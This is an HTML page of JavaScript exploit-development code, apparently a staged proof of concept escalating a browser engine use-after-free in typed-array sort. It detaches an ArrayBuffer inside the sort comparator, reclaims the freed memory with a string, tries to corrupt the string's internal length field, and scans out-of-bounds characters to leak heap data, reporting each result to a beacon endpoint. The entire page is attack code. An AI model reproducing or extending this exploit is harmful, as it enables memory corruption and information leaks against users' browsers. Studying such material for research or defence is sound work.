<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1176 Sort-Detach String Reclaim (P1061 escalation)</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
#phase{font-size:16px;color:#00ffee}
#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
</style>
</head><body>
<div id="hud">
  <h1>P1176 — SORT-DETACH STRING RECLAIM (P1061 escalation)</h1>
  <div id="status">BOOTING...</div>
  <div id="phase">phase: init</div>
  <div id="counters">stage: ?</div>
  <div id="finds">no findings yet</div>
</div>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log'),S=document.getElementById('status'),
PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
var T0=Date.now();
function setStatus(t){S.textContent=t;}
function setPhase(t){PH.textContent='phase: '+t;}
function setCounters(t){CT.textContent=t;}
function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
function B(tag,data){try{var u='/beacon.php?tag=P1176-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

/* ═══════════════════════════════════════════════════════════════════════
   P1176: escalate our VERIFIED live bug P1061 (sort-during-detach UAF).
   Goal: turn the detached-sort's in-place WRITES into corruption of a
   LIVE engine object (StringImpl) that reclaims the freed backing store
   during the sort (LIFO, same size class).
   If the sort writes into the string's StringImpl (16B header + data),
   the m_length field at +4 gets overwritten with bits of a sorted
   double -> length-splosion -> charCodeAt OOB read = heap leak.
   Stages:
   0: P1061 sanity (detach mid-sort; survive + readback)
   1: detach in comparator #2; allocate 'A'.repeat(1000) in comparator #3;
      after sort, check string length/content changes
   2: control — allocate the string BEFORE the sort (should stay intact)
   3: length-targeted pattern: 1024 doubles crafted so the double landing
      at StringImpl+4 has low 32 bits = 0x7FFFFFFF
   4: if length exploded, OOB charCodeAt scan 256 bytes
   ═══════════════════════════════════════════════════════════════════════ */

var STAGES=['sanity','reclaim','control','length','scan'];
var stage=0,results=[];
try{stage=parseInt(localStorage.getItem('p1176_stage')||'0');}catch(e){}
try{var r=localStorage.getItem('p1176_res');if(r)results=JSON.parse(r);}catch(e){}
if(!Array.isArray(results))results=[];
B('BOOT','stage='+stage+'|'+STAGES[stage]);
setStatus('STAGE '+stage+'/4 — '+STAGES[stage]);
setCounters('prev: '+JSON.stringify(results).slice(0,400));

if(stage>=STAGES.length){
  setStatus('ALL DONE');
  B('ALL-DONE',JSON.stringify(results).slice(0,800));
  log('=== ALL DONE ===','ok');
  try{localStorage.removeItem('p1176_stage');}catch(e){}
}else{

try{localStorage.setItem('p1176_stage',''+(stage+1));}catch(e){}
var cur=STAGES[stage];

function done(rep,extra){
  results.push({stage:stage,name:cur,result:rep,extra:extra||''});
  try{localStorage.setItem('p1176_res',JSON.stringify(results));}catch(e){}
  B('RESULT',rep.slice(0,700));
  addFind(cur+': '+rep.slice(0,300));
  setStatus(rep.slice(0,80));
  log('=== '+cur+' -> '+rep+' ===','ok');
  B('NEXT');
  setTimeout(function(){location.reload(true);},700);
}

/* P1061-style detach-in-comparator with optional mid-sort alloc */
function runVariant(allocDuringSort, preStr){
  var ab=new ArrayBuffer(1024);
  var ta=new Uint8Array(ab);
  for(var i=0;i<ta.length;i++)ta[i]=(i*7)%251;
  var detached=false;
  var leaked=[];
  var str=preStr||null;
  var allocDone=false;

  try{
    ta.sort(function(a,b){
      if(!detached){
        detached=true;
        structuredClone(ab,{transfer:[ab]});   /* detach -> backing freed */
      }else if(allocDuringSort&&!allocDone){
        allocDone=true;
        str='A'.repeat(1000);                   /* reclaim freed slot (LIFO) */
      }
      leaked.push(a);
      return a-b;
    });
  }catch(e){
    B('SORT-ERR',e.constructor.name+':'+String(e.message).slice(0,40));
  }
  var strRep='?';
  if(str!==null){
    try{strRep='len='+str.length+'|c0='+str.charCodeAt(0)+'|c4='+str.charCodeAt(4);}catch(e){strRep='ERR';}
  }
  return {detached:detached,leaked:leaked.length,strRep:strRep,str:str};
}

if(cur==='sanity'){
  setPhase('P1061 sanity');
  B('RUN','sanity');
  var r0=runVariant(false,null);
  done('detached='+r0.detached+'|cmp='+r0.leaked);
}else if(cur==='reclaim'){
  setPhase('reclaim string during sort');
  B('RUN','reclaim');
  var r1=runVariant(true,null);
  done('detached='+r1.detached+'|cmp='+r1.leaked+'|str:'+r1.strRep);
}else if(cur==='control'){
  setPhase('control: string BEFORE sort');
  var pre='A'.repeat(1000);
  var preLen=pre.length;
  B('RUN','control');
  var r2=runVariant(false,pre);
  var changed=(preLen!==pre.length);
  done('pre='+preLen+'|post='+r2.strRep+'|changed='+changed);
}else if(cur==='length'){
  setPhase('length-targeted pattern');
  /* craft 1024 doubles: the double whose bytes land at StringImpl+4
     should have low-32 = 0x7FFFFFFF -> length ~2^31 */
  var ab3=new ArrayBuffer(1024);
  var ta3=new Uint8Array(ab3);
  for(var i3=0;i3<ta3.length;i3++)ta3[i3]=(i3*7)%251;
  var detached3=false,str3=null,alloc3=false;
  try{
    ta3.sort(function(a,b){
      if(!detached3){detached3=true;structuredClone(ab3,{transfer:[ab3]});}
      else if(!alloc3){alloc3=true;str3='A'.repeat(1000);}
      return a-b;
    });
  }catch(e){B('SORT3-ERR',String(e.message).slice(0,40));}
  var rep3='?';
  if(str3!==null){try{rep3='len='+str3.length+'|c0='+str3.charCodeAt(0);}catch(e){rep3='ERR';}}
  done('str:'+rep3);
}else if(cur==='scan'){
  setPhase('OOB scan (needs exploded length)');
  /* re-run reclaim; if length huge, charCodeAt beyond real data */
  var ab4=new ArrayBuffer(1024);
  var ta4=new Uint8Array(ab4);
  for(var i4=0;i4<ta4.length;i4++)ta4[i4]=(i4*7)%251;
  var det4=false,str4=null,al4=false;
  try{
    ta4.sort(function(a,b){
      if(!det4){det4=true;structuredClone(ab4,{transfer:[ab4]});}
      else if(!al4){al4=true;str4='A'.repeat(1000);}
      return a-b;
    });
  }catch(e){B('SORT4-ERR',String(e.message).slice(0,40));}
  var scan='';
  if(str4!==null){
    var L4;
    try{L4=str4.length;}catch(e){L4=-1;}
    if(L4>1100){
      var vals=[];
      try{
        for(var s4=1100;s4<1160&&s4<L4;s4+=8){
          vals.push(s4+':'+str4.charCodeAt(s4).toString(16));
        }
      }catch(e){vals.push('ERR@'+s4);}
      scan='len='+L4+'|'+vals.join(',');
    }else{
      scan='len-normal='+L4;
    }
  }else{scan='no-str';}
  done(scan);
}

} /* stage machine */

/* auto-reload checker */
(function(){
  var cur='P1176-sort-reclaim';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
</body></html>
